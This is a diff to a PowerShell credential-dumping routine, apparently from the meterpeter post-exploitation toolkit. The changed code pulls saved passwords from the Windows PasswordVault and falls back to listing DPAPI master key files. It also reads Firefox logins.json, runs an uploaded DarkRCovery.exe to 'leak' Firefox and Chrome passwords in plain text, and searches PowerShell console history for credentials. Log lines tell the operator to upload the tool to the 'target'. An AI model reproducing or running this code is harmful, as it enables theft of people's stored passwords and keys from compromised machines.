@@ -824,25 +824,45 @@ function ADDONS {
 function CREDS_DUMP {
     ## Retrieve IE Credentials
     echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
-    echo "`nhttps://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1" >> $LogFilePath\BrowserEnum.log
-    echo "--------------------------------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    ## Retrieve Credentials from PasswordVault
+    # https://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1
     [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
     $vault = New-Object Windows.Security.Credentials.PasswordVault
     $DumpVault = $vault.RetrieveAll()| % { $_.RetrievePassword();$_ }|select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
+ 
     If(-not($DumpVault) -or $DumpVault -eq $null){
-        echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+        echo "------------------------------------------------" >> $LogFilePath\BrowserEnum.log
+        echo "None Credentials found => extracting master keys" >> $LogFilePath\BrowserEnum.log
+        ## None credentials found in Vault, trying to extract master keys
+
+        If(Test-Path -Path "$env:AppData\Microsoft\Protect\"){
+            $SIDPath = "$env:AppData\Microsoft\Protect\"
+            $StoreSID = dir "$SIDPath"|Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue
+            echo "UserSID: $StoreSID" >> $LogFilePath\BrowserEnum.log
+            $UserSSIDir = cmd.exe /c dir /a /o-d /p "%AppData%\Microsoft\Protect\$StoreSID"|findstr /I /V /C:"<DIR>" /I /V /C:"Preferred" /I /V /C:"File" /I /V /C:"dir" /I /V /C:"volume"
+            $DelSpaces = $UserSSIDir|Where-Object {-not[string]::IsNullOrEmpty(([string]$_).trim())}
+            $SplitString = $DelSpaces -split('468')
+            $RegexSearch = $SplitString|Select-String -pattern '[a-zA-Z]'
+            $RawMasterKeys = $RegexSearch -replace ' ',''
+            ## Build table to display results
+            echo "`nMaster keys" >> $LogFilePath\BrowserEnum.log
+            echo "-----------" >> $LogFilePath\BrowserEnum.log
+            echo $RawMasterKeys >> $LogFilePath\BrowserEnum.log
+        }else{
+            echo "None master keys found" >> $LogFilePath\BrowserEnum.log
+        }
+
     }else{
         echo "$DumpVault" >> $LogFilePath\BrowserEnum.log
     }
 
     ## Retrieve FireFox Credentials
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
-    echo "`ngit clone https://github.com/Unode/firefox_decrypt.git" >> $LogFilePath\BrowserEnum.log
-    echo "------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    echo "-----------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
         If(-not(Test-Path "$Bookmarks_Path")){
-            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+            echo "None Credentials found" >> $LogFilePath\BrowserEnum.log
         }else{
             $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
             $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
@@ -858,9 +878,10 @@ function CREDS_DUMP {
 
     ## Leak Firefox|Chrome credentials to plain text { EXE Coded By 0xyg3n }
     # DarkRCovery requires to be uploaded to $env:TMP { Client working dir }
+    echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
+    echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
     If(Test-Path "$env:TMP\DarkRCovery.exe"){
-        echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-        cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
+    cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
         If(Test-Path "$env:TMP\Leaked.txt"){
             $StoreCreds = Get-Content "$env:TMP\Leaked.txt" -ErrorAction SilentlyContinue
             ## Check for powershell version [5] to Parse Data
@@ -869,7 +890,6 @@ function CREDS_DUMP {
                 ## Remove from output what i dont like
                 $ParseData = $StoreCreds|Select -Skip 1|Select -SkipLast 2
                 $RawCredentials = $ParseData -replace 'url:','Hostname:' -replace '\[PASSWORD\]',''
-                 #|Where-Object {-not[string]::IsNullOrEmpty(([string]$_).trim())} # remove all brake lines
             }else{
                 $RawCredentials = $StoreCreds
             }
@@ -883,29 +903,28 @@ function CREDS_DUMP {
             cd $IPATH
         }
     }else{
-        echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-        echo "{Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP}" >> $LogFilePath\BrowserEnum.log
-        echo "{And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials}" >> $LogFilePath\BrowserEnum.log
-        echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe}" >> $LogFilePath\BrowserEnum.log
+        echo "Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP" >> $LogFilePath\BrowserEnum.log
+        echo "And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials" >> $LogFilePath\BrowserEnum.log
+        echo "https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe" >> $LogFilePath\BrowserEnum.log
     }
     
     ## Search for passwords in { ConsoleHost_history }
     If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
-        echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
-        echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
-        echo "{ConsoleHost_history.txt not found}" >> $LogFilePath\BrowserEnum.log
+        echo "`n`n[ Creds in ConsoleHost_history.txt ]" >> $LogFilePath\BrowserEnum.log
+        echo "------------------------------------" >> $LogFilePath\BrowserEnum.log
+        echo "ConsoleHost_history.txt => not found" >> $LogFilePath\BrowserEnum.log
     }else{
         $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
         $Credentials = Get-Content "$Path"|Select-String -pattern "passw","user","login","email"
         If(-not($Credentials) -or $Credentials -eq $null){
-            echo "`n`nCreds in ConsoleHost_history" >> $LogFilePath\BrowserEnum.log
-            echo "----------------------------" >> $LogFilePath\BrowserEnum.log
-            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+            echo "`n`n[ Creds in ConsoleHost_history.txt ]" >> $LogFilePath\BrowserEnum.log
+            echo "------------------------------------" >> $LogFilePath\BrowserEnum.log
+            echo "None Credentials found" >> $LogFilePath\BrowserEnum.log
         }else{
             ## Loop in each string found
             $MyPSObject = ForEach ($token in $Credentials){
                 New-Object -TypeName PSObject -Property @{
-                    "Creds in ConsoleHost_history" = $token
+                    "[ Creds in ConsoleHost_history ]" = $token
                 }
             }
             echo "`n" $MyPSObject >> $LogFilePath\BrowserEnum.log
